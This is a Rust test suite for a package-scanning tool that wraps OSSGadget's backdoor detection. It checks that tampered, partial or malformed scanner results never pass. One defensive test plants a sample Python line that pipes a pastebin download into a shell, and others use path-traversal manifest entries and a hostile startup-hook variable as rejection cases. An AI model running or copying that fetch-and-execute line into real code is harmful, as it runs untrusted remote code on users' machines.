use packweir::{
    config::{
        CommandScanner, Config, OSSGADGET_VERSION, OssgadgetMode, PinnedResource, ScannerDriver,
    },
    model::{Outcome, sha256},
    scanner,
    store::Job,
};
use serde_json::{Value, json};
use std::{
    collections::BTreeMap,
    io::{Cursor, Write},
    path::{Path, PathBuf},
    sync::OnceLock,
};

const ENGINE: &str =
    "Microsoft.ApplicationInspector 1.9.55 (from Microsoft.CST.OSSGadget.CLI 0.2.49)";
const PACKAGE: &str = "0f139a32ecf35538d44cf0be7781be6194a395bc331d4084240f77f1c5b8aded";
const SOURCE: &str = "4063457b40211c25b41d56465d41783f2d42c5c1";

fn host() -> &'static Path {
    static HOST: OnceLock<PathBuf> = OnceLock::new();
    HOST.get_or_init(|| {
        let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("target/ossgadget-fixture").join(std::process::id().to_string());
        std::fs::create_dir_all(&root).unwrap();
        let source = root.join("host.rs");
        std::fs::write(&source, r#"
use std::{io::{Read,Write},path::Path};
fn main() {
 let args:Vec<_>=std::env::args().skip(1).collect();
 assert_eq!(args.len(),6); assert_eq!(args[0],"exec"); assert_eq!(args[1],"--runtimeconfig"); assert_eq!(args[3],"--depsfile");
 assert!(std::env::var_os("DATABASE_URL").is_none()); assert!(std::env::var_os("DOTNET_STARTUP_HOOKS").is_none());
 let root=Path::new(&args[5]).parent().unwrap();
 assert!(root.join("packweir-ossgadget-helper.runtimeconfig.json").is_file());
 assert!(root.join("packweir-ossgadget-helper.deps.json").is_file());
 let mut input=String::new(); std::io::stdin().read_to_string(&mut input).unwrap();
 assert!(input.contains("\"protocol_version\":1") && input.contains("\"files\":[") && input.contains("\"sha256\":"));
 let mode=std::fs::read_to_string(root.join("fixture-mode")).unwrap();
 if mode=="sleep" {std::thread::sleep(std::time::Duration::from_secs(3));}
 if mode=="huge" {std::io::stdout().write_all(&vec![b'x';1024*1024+1]).unwrap();return;}
 if mode=="tamper" {
  let path=root.parent().unwrap().join("ossgadget-input/f00000/fixture.py");
  let mut permissions=std::fs::metadata(&path).unwrap().permissions(); permissions.set_readonly(false);std::fs::set_permissions(&path,permissions).unwrap();std::fs::write(path,b"changed").unwrap();
 }
 print!("{}",std::fs::read_to_string(root.join("fixture-report.json")).unwrap());
 if mode=="error" {std::process::exit(2);}
}
"#).unwrap();
        let binary = root.join(format!("host{}", std::env::consts::EXE_SUFFIX));
        assert!(std::process::Command::new("rustc").args(["--edition=2024"]).arg(&source).arg("-o").arg(&binary).status().unwrap().success());
        binary
    })
}

fn pin(path: &Path) -> PinnedResource {
    PinnedResource {
        path: path.to_string_lossy().into_owned(),
        sha256: sha256(&std::fs::read(path).unwrap()),
    }
}
fn job(bytes: &[u8], filename: &str) -> Job {
    Job {
        id: uuid::Uuid::new_v4(),
        subject: sha256(bytes),
        configuration: "ossgadget-test".into(),
        filename: filename.into(),
        lease: uuid::Uuid::new_v4(),
        context_revision: 0,
    }
}
fn report(files: &[(&str, &[u8], &str)], finding: bool) -> Value {
    let files: Vec<_> = files.iter().map(|(path, bytes, status)| json!({"path":path,"sha256":sha256(bytes),"size":bytes.len(),"status":status,"upstream_status":if *status=="analyzed" {Some("Analyzed")}else if *status=="affected" {Some("Affected")}else {None},"reason":if *status=="skipped" {Some("unsupported_binary_or_encoding")}else{None}})).collect();
    let analyzed = files
        .iter()
        .filter(|file| ["analyzed", "affected"].contains(&file["status"].as_str().unwrap()))
        .count();
    let skipped = files
        .iter()
        .filter(|file| file["status"] == "skipped")
        .count();
    let complete = analyzed == files.len();
    let findings = if finding {
        json!([{"path":files[0]["path"],"rule_id":"fixture-rule","description":"fixture only","tags":["fixture"],"severity":"Moderate","confidence":"High","severity_value":4,"confidence_value":4,"start_line":1,"start_column":1,"end_line":1,"end_column":2,"language":"Python"}])
    } else {
        json!([])
    };
    json!({"protocol_version":1,"helper_version":"1","engine":ENGINE,"package_sha256":PACKAGE,"source_revision":SOURCE,"mode":"backdoor","status":if complete{"complete"}else{"partial"},"complete":complete,"archive_crawling":false,"rules_sha256":null,"engine_result_code":if finding{0}else{1},"engine_result_name":if finding{"Success"}else{"NoMatches"},"totals":{"requested":files.len(),"analyzed":analyzed,"skipped":skipped,"errored":0,"matches":findings.as_array().unwrap().len()},"files":files,"findings":findings,"diagnostics":[]})
}

struct Fixture {
    _directory: tempfile::TempDir,
    deployment: PathBuf,
    scanner: CommandScanner,
}
impl Fixture {
    fn new(report: Value, mode: &str) -> Self {
        let directory = tempfile::tempdir().unwrap();
        let deployment = directory.path().join("deployment");
        std::fs::create_dir(&deployment).unwrap();
        for name in [
            "packweir-ossgadget-helper.dll",
            "packweir-ossgadget-helper.runtimeconfig.json",
            "packweir-ossgadget-helper.deps.json",
        ] {
            std::fs::write(deployment.join(name), b"fixture only").unwrap();
        }
        std::fs::write(
            deployment.join("fixture-report.json"),
            serde_json::to_vec(&report).unwrap(),
        )
        .unwrap();
        std::fs::write(deployment.join("fixture-mode"), mode).unwrap();
        let files: BTreeMap<_, _> = std::fs::read_dir(&deployment)
            .unwrap()
            .map(|entry| {
                let path = entry.unwrap().path();
                (
                    path.file_name().unwrap().to_string_lossy().into_owned(),
                    sha256(&std::fs::read(path).unwrap()),
                )
            })
            .collect();
        let manifest = directory.path().join("manifest.json");
        std::fs::write(&manifest,serde_json::to_vec(&json!({"protocol_version":1,"entrypoint":"packweir-ossgadget-helper.dll","files":files})).unwrap()).unwrap();
        let scanner = CommandScanner {
            program: host().to_string_lossy().into_owned(),
            args: vec![],
            version: OSSGADGET_VERSION.into(),
            timeout_seconds: 10,
            environment: BTreeMap::new(),
            program_sha256: Some(sha256(&std::fs::read(host()).unwrap())),
            resources: BTreeMap::from([("manifest".into(), pin(&manifest))]),
            driver: ScannerDriver::Ossgadget {
                deployment_root: deployment.to_string_lossy().into_owned(),
                manifest: "manifest".into(),
                mode: OssgadgetMode::Backdoor,
                custom_rules: None,
                deny_rules: vec![],
            },
        };
        Self {
            _directory: directory,
            deployment,
            scanner,
        }
    }
    async fn run(&self, bytes: &[u8], filename: &str) -> anyhow::Result<scanner::ScannerOutput> {
        scanner::run(&self.scanner, &job(bytes, filename), bytes, &json!({})).await
    }
    fn manifest(&mut self, change: impl FnOnce(&mut Value)) {
        let resource = self.scanner.resources.get_mut("manifest").unwrap();
        let mut value: Value =
            serde_json::from_slice(&std::fs::read(&resource.path).unwrap()).unwrap();
        change(&mut value);
        std::fs::write(&resource.path, serde_json::to_vec(&value).unwrap()).unwrap();
        resource.sha256 = sha256(&std::fs::read(&resource.path).unwrap());
    }
}

#[tokio::test]
async fn complete_rule_scan_passes_and_findings_require_investigation_or_explicit_denial() {
    let bytes = b"print('hello')\n";
    let clear = Fixture::new(
        report(&[("f00000/fixture.py", bytes, "analyzed")], false),
        "normal",
    );
    let output = clear.run(bytes, "fixture.py").await.unwrap();
    assert_eq!(output.outcome, Outcome::Pass);
    assert_eq!(output.details["files"][0]["path"], "fixture.py");
    let mut finding = Fixture::new(
        report(&[("f00000/fixture.py", bytes, "affected")], true),
        "normal",
    );
    assert_eq!(
        finding.run(bytes, "fixture.py").await.unwrap().outcome,
        Outcome::Inconclusive
    );
    if let ScannerDriver::Ossgadget { deny_rules, .. } = &mut finding.scanner.driver {
        deny_rules.push("fixture-rule".into());
    }
    assert_eq!(
        finding.run(bytes, "fixture.py").await.unwrap().outcome,
        Outcome::Fail
    );
}

#[tokio::test]
async fn partial_binary_and_mixed_archive_coverage_cannot_pass() {
    let bytes = b"\x7fELF\0binary";
    let fixture = Fixture::new(
        report(&[("f00000/fixture.py", bytes, "skipped")], false),
        "normal",
    );
    assert_eq!(
        fixture.run(bytes, "fixture.py").await.unwrap().outcome,
        Outcome::Inconclusive
    );
    let falsely_complete = Fixture::new(
        report(&[("f00000/fixture.py", bytes, "analyzed")], false),
        "normal",
    );
    assert_eq!(
        falsely_complete
            .run(bytes, "fixture.py")
            .await
            .unwrap()
            .outcome,
        Outcome::Inconclusive
    );
    let mut zip = zip::ZipWriter::new(Cursor::new(vec![]));
    zip.start_file("a.py", zip::write::SimpleFileOptions::default())
        .unwrap();
    zip.write_all(b"print('hello')").unwrap();
    zip.start_file("b.so", zip::write::SimpleFileOptions::default())
        .unwrap();
    zip.write_all(bytes).unwrap();
    let bytes = zip.finish().unwrap().into_inner();
    let fixture = Fixture::new(
        report(
            &[
                ("f00000/a.py", b"print('hello')", "analyzed"),
                ("f00001/b.so", b"\x7fELF\0binary", "skipped"),
            ],
            false,
        ),
        "normal",
    );
    let output = fixture.run(&bytes, "package.zip").await.unwrap();
    assert_eq!(output.outcome, Outcome::Inconclusive);
    assert_eq!(output.details["files"][1]["path"], "package.zip!/b.so");
}

#[tokio::test]
async fn malformed_unbound_or_incomplete_reports_never_approve() {
    let bytes = b"print('hello')";
    let original = report(&[("f00000/fixture.py", bytes, "analyzed")], false);
    let mut cases = vec![];
    for (key, value) in [
        ("protocol_version", json!(2)),
        ("helper_version", json!("other")),
        ("engine", json!("other")),
        ("package_sha256", json!("0".repeat(64))),
        ("source_revision", json!("0".repeat(40))),
        ("mode", json!("characteristic")),
        ("archive_crawling", json!(true)),
        ("rules_sha256", json!("a".repeat(64))),
        ("engine_result_code", json!(9)),
        ("engine_result_name", json!("Error")),
        ("files", json!([])),
        (
            "totals",
            json!({"requested":1,"analyzed":0,"skipped":0,"errored":0,"matches":0}),
        ),
        ("complete", json!(false)),
        ("diagnostics", json!(["error"])),
    ] {
        let mut case = original.clone();
        case[key] = value;
        cases.push(case);
    }
    for (key, value) in [
        ("path", json!("elsewhere.py")),
        ("sha256", json!("0".repeat(64))),
        ("size", json!(999)),
        ("status", json!("not_analyzed")),
        ("upstream_status", json!("Skipped")),
    ] {
        let mut case = original.clone();
        case["files"][0][key] = value;
        cases.push(case);
    }
    let mut duplicate = original.clone();
    let duplicated_file = duplicate["files"][0].clone();
    duplicate["files"]
        .as_array_mut()
        .unwrap()
        .push(duplicated_file);
    cases.push(duplicate);
    let mut unbound = report(&[("f00000/fixture.py", bytes, "affected")], true);
    unbound["findings"][0]["path"] = json!("elsewhere.py");
    cases.push(unbound);
    for case in cases {
        assert!(
            Fixture::new(case, "normal")
                .run(bytes, "fixture.py")
                .await
                .is_err()
        );
    }
}

#[tokio::test]
async fn changed_deployment_loader_inputs_paths_and_manifest_pins_cannot_run() {
    let bytes = b"pass";
    let original = report(&[("f00000/fixture.py", bytes, "analyzed")], false);
    let fixture = Fixture::new(original.clone(), "normal");
    std::fs::write(
        fixture
            .deployment
            .join("packweir-ossgadget-helper.deps.json"),
        b"changed",
    )
    .unwrap();
    assert!(fixture.run(bytes, "fixture.py").await.is_err());
    for path in [
        "../outside.dll",
        "/outside.dll",
        "x\\outside.dll",
        "C:outside.dll",
        "a/./outside.dll",
        "a//outside.dll",
        "NUL.dll",
    ] {
        let mut fixture = Fixture::new(original.clone(), "normal");
        fixture.manifest(|manifest| {
            manifest["files"][path] = json!("0".repeat(64));
        });
        assert!(fixture.run(bytes, "fixture.py").await.is_err());
    }
    let mut fixture = Fixture::new(original.clone(), "normal");
    fixture.manifest(|manifest| {
        manifest["files"]
            .as_object_mut()
            .unwrap()
            .remove("packweir-ossgadget-helper.runtimeconfig.json");
    });
    assert!(fixture.run(bytes, "fixture.py").await.is_err());
    let mut fixture = Fixture::new(original, "normal");
    fixture
        .scanner
        .resources
        .get_mut("manifest")
        .unwrap()
        .sha256 = "0".repeat(64);
    assert!(fixture.run(bytes, "fixture.py").await.is_err());
}

#[tokio::test]
async fn mutation_timeout_oversized_output_and_helper_error_never_pass() {
    let bytes = b"pass";
    for mode in ["tamper", "huge"] {
        let fixture = Fixture::new(
            report(&[("f00000/fixture.py", bytes, "analyzed")], false),
            mode,
        );
        assert!(fixture.run(bytes, "fixture.py").await.is_err());
    }
    let mut fixture = Fixture::new(
        report(&[("f00000/fixture.py", bytes, "analyzed")], false),
        "sleep",
    );
    fixture.scanner.timeout_seconds = 1;
    assert!(fixture.run(bytes, "fixture.py").await.is_err());
    let fixture = Fixture::new(
        report(&[("f00000/fixture.py", bytes, "analyzed")], false),
        "error",
    );
    assert_eq!(
        fixture.run(bytes, "fixture.py").await.unwrap().outcome,
        Outcome::Error
    );
}

#[test]
fn configuration_requires_pins_qualified_version_modes_and_distinct_rules() {
    let bytes = b"pass";
    let fixture = Fixture::new(
        report(&[("f00000/fixture.py", bytes, "analyzed")], false),
        "normal",
    );
    fixture.scanner.validate().unwrap();
    let mut missing = fixture.scanner.clone();
    missing.program_sha256 = None;
    assert!(missing.validate().is_err());
    let mut version = fixture.scanner.clone();
    version.version = "other".into();
    assert!(version.validate().is_err());
    let mut custom = fixture.scanner.clone();
    if let ScannerDriver::Ossgadget { mode, .. } = &mut custom.driver {
        *mode = OssgadgetMode::Custom;
    }
    assert!(custom.validate().is_err());
    let mut environment = fixture.scanner.clone();
    environment
        .environment
        .insert("DOTNET_STARTUP_HOOKS".into(), "evil".into());
    assert!(environment.validate().is_err());
    let mut config = Config::load(Path::new("packweir.toml")).unwrap();
    for name in ["agent", "provenance", "required_signature"] {
        config.scanners.clear();
        config.scanners.insert(name.into(), fixture.scanner.clone());
        assert!(config.validate().is_err());
    }
    let original = fixture.scanner.clone();
    let encoded = toml::to_string(&original).unwrap();
    let decoded: CommandScanner = toml::from_str(&encoded).unwrap();
    decoded.validate().unwrap();
    assert_eq!(
        serde_json::to_value(original).unwrap(),
        serde_json::to_value(decoded).unwrap()
    );
}

#[tokio::test]
#[ignore = "requires the provisioned real OSSGadget helper deployment and .NET 10 host"]
async fn real_helper_driver_qualification() {
    let host = std::env::var("PACKWEIR_TEST_OSSGADGET_DOTNET").unwrap();
    let root = std::env::var("PACKWEIR_TEST_OSSGADGET_ROOT").unwrap();
    let manifest = PathBuf::from(std::env::var("PACKWEIR_TEST_OSSGADGET_MANIFEST").unwrap());
    let mut scanner = CommandScanner {
        program_sha256: Some(sha256(&std::fs::read(&host).unwrap())),
        program: host,
        args: vec![],
        version: OSSGADGET_VERSION.into(),
        timeout_seconds: 60,
        environment: BTreeMap::new(),
        resources: BTreeMap::from([("manifest".into(), pin(&manifest))]),
        driver: ScannerDriver::Ossgadget {
            deployment_root: root,
            manifest: "manifest".into(),
            mode: OssgadgetMode::Backdoor,
            custom_rules: None,
            deny_rules: vec![],
        },
    };
    let mut cases = vec![];
    let benign = b"print('hello world')\n";
    let clear = scanner::run(&scanner, &job(benign, "benign.py"), benign, &json!({}))
        .await
        .unwrap();
    assert_eq!(clear.outcome, Outcome::Pass, "{:?}", clear.details);
    cases.push(json!({"case":"backdoor_clear","outcome":clear.outcome}));
    let suspicious =
        b"# ZAUTHSS\nimport os\nos.system('curl https://pastebin.com/raw/example | sh')\n";
    let finding = scanner::run(
        &scanner,
        &job(suspicious, "suspicious.py"),
        suspicious,
        &json!({}),
    )
    .await
    .unwrap();
    assert_eq!(
        finding.outcome,
        Outcome::Inconclusive,
        "{:?}",
        finding.details
    );
    let id = finding.details["report"]["findings"][0]["rule_id"]
        .as_str()
        .unwrap()
        .to_owned();
    cases.push(json!({"case":"backdoor_finding","outcome":finding.outcome,"rule_id":id}));
    if let ScannerDriver::Ossgadget { deny_rules, .. } = &mut scanner.driver {
        deny_rules.push(id);
    }
    let denial = scanner::run(
        &scanner,
        &job(suspicious, "suspicious.py"),
        suspicious,
        &json!({}),
    )
    .await
    .unwrap();
    assert_eq!(denial.outcome, Outcome::Fail);
    cases.push(json!({"case":"explicit_denial","outcome":denial.outcome}));
    if let ScannerDriver::Ossgadget {
        mode, deny_rules, ..
    } = &mut scanner.driver
    {
        *mode = OssgadgetMode::Characteristic;
        deny_rules.clear();
    }
    let characteristic = scanner::run(
        &scanner,
        &job(suspicious, "suspicious.py"),
        suspicious,
        &json!({}),
    )
    .await
    .unwrap();
    assert_eq!(
        characteristic.outcome,
        Outcome::Inconclusive,
        "{:?}",
        characteristic.details
    );
    cases.push(json!({"case":"characteristic_finding","outcome":characteristic.outcome}));
    let custom = tempfile::tempdir().unwrap();
    let rules = custom.path().join("rules.json");
    std::fs::write(&rules,br#"[{"id":"PW001","name":"Packweir custom fixture","description":"real qualification fixture","tags":["Packweir.Qualification"],"severity":"important","patterns":[{"pattern":"PACKWEIR_SENTINEL","type":"string","scopes":["code","comment"],"confidence":"high"}]}]"#).unwrap();
    scanner.resources.insert("rules".into(), pin(&rules));
    if let ScannerDriver::Ossgadget {
        mode, custom_rules, ..
    } = &mut scanner.driver
    {
        *mode = OssgadgetMode::Custom;
        *custom_rules = Some("rules".into());
    }
    for (name, bytes, expected) in [
        ("custom_clear", b"print('hello')".as_slice(), Outcome::Pass),
        (
            "custom_finding",
            b"# PACKWEIR_SENTINEL\n".as_slice(),
            Outcome::Inconclusive,
        ),
    ] {
        let output = scanner::run(&scanner, &job(bytes, "custom.py"), bytes, &json!({}))
            .await
            .unwrap();
        assert_eq!(output.outcome, expected, "{:?}", output.details);
        cases.push(json!({"case":name,"outcome":output.outcome}));
    }
    let binary = b"\x7fELF\0binary";
    let partial = scanner::run(&scanner, &job(binary, "binary.so"), binary, &json!({}))
        .await
        .unwrap();
    assert_eq!(partial.outcome, Outcome::Inconclusive);
    cases.push(json!({"case":"binary_partial","outcome":partial.outcome}));
    let mut archive = zip::ZipWriter::new(Cursor::new(vec![]));
    archive
        .start_file("benign.py", zip::write::SimpleFileOptions::default())
        .unwrap();
    archive.write_all(benign).unwrap();
    archive
        .start_file("binary.so", zip::write::SimpleFileOptions::default())
        .unwrap();
    archive.write_all(binary).unwrap();
    let archive = archive.finish().unwrap().into_inner();
    let mixed = scanner::run(&scanner, &job(&archive, "mixed.zip"), &archive, &json!({}))
        .await
        .unwrap();
    assert_eq!(mixed.outcome, Outcome::Inconclusive);
    assert_eq!(mixed.details["report"]["totals"]["analyzed"], 1);
    assert_eq!(mixed.details["report"]["totals"]["skipped"], 1);
    cases.push(json!({"case":"mixed_binary_partial","outcome":mixed.outcome}));
    std::fs::write(&rules, b"[invalid-json").unwrap();
    scanner.resources.insert("rules".into(), pin(&rules));
    let malformed = scanner::run(&scanner, &job(benign, "benign.py"), benign, &json!({}))
        .await
        .unwrap();
    assert_eq!(malformed.outcome, Outcome::Error);
    cases.push(json!({"case":"malformed_rules","outcome":malformed.outcome}));
    let manifest_digest = scanner.resources["manifest"].sha256.clone();
    let mut wrong = scanner.clone();
    wrong.resources.get_mut("manifest").unwrap().sha256 = "0".repeat(64);
    assert!(
        scanner::run(&wrong, &job(benign, "benign.py"), benign, &json!({}))
            .await
            .is_err()
    );
    cases.push(json!({"case":"deployment_pin_rejected","outcome":"error","rejected":true}));
    let wrong_subject = job(b"different bytes", "benign.py");
    assert!(
        scanner::run(&scanner, &wrong_subject, benign, &json!({}))
            .await
            .is_err()
    );
    cases.push(json!({"case":"subject_digest_rejected","outcome":"error","rejected":true}));
    println!(
        "PACKWEIR_OSSGADGET_PROOF={}",
        json!({"qualified":true,"driver_version":OSSGADGET_VERSION,"deployment_manifest_sha256":manifest_digest,"cases":cases})
    );
}
